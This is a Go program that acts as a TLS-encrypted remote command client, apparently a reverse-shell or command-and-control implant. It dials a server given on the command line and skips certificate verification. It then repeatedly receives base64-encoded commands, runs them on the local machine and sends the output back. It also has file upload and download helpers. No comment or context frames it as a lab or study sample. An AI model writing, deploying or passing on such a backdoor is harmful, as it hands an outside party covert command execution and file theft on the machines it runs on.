package main

import (
	// "bufio"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

func handleError(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

func uploadFile(conn *tls.Conn, path string) {
	// open file to upload
	fi, err := os.Open(path)
	handleError(err)
	defer fi.Close()
	// upload
	_, err = io.Copy(conn, fi)
	handleError(err)
}

func downloadFile(conn *tls.Conn, path string) {
	// create new file to hold response
	fo, err := os.Create(path)
	handleError(err)
	defer fo.Close()

	handleError(err)
	defer conn.Close()

	_, err = io.Copy(fo, conn)
	handleError(err)
}

func genCert(email string) string {
	cmd, err := exec.Command("/bin/sh", "../certGen.sh", email).Output()
	handleError(err)
	outstr := string(cmd)
	return outstr
}
func getOS(conn *tls.Conn) string {

	return runtime.GOOS

}
func execInput(input string) (string, error){
	// Remove the newline character.
	input = strings.TrimSuffix(input, "\n")
	fmt.Println(input)
	// Prepare the command to execute.
	cmd, err := exec.Command(input).Output()

	return string(cmd), err
}

func main() {
	arguments := os.Args
	if len(arguments) == 1 {
		fmt.Println("Please provide host:port")
		return
	}

	cert, err := tls.LoadX509KeyPair("certs/client.pem", "certs/client.key")

	handleError(err)
	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
	conn, err := tls.Dial("tcp", arguments[1], &config)

	handleError(err)

	defer conn.Close()
	log.Println("Connected to: ", strings.Split(conn.RemoteAddr().String(), ":")[0])

	state := conn.ConnectionState()
	for _, v := range state.PeerCertificates {
		fmt.Println(x509.MarshalPKIXPublicKey(v.PublicKey))
		fmt.Println(v.Subject)
	}
	log.Println("client: handshake: ", state.HandshakeComplete)
	log.Println("client: mutual: ", state.NegotiatedProtocolIsMutual)
	
	for {
		buffer := make([]byte, 1024)
		_, err := conn.Read(buffer)
		handleError(err)
		sDec, _ := base64.StdEncoding.DecodeString(string(buffer[:]))
		resp, err:= execInput(string(sDec))
		
		conn.Write([]byte(resp))

		time.Sleep(time.Second)
	}
}
